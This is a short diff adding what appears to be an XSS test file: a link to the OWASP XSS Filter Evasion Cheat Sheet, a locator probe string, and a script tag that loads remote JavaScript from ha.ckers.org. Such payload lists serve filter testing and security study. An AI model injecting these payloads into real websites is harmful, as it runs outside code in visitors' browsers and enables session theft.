@@ -1,0 +1,6 @@
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+'';!--"<XSS>=&{()}
+
+
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
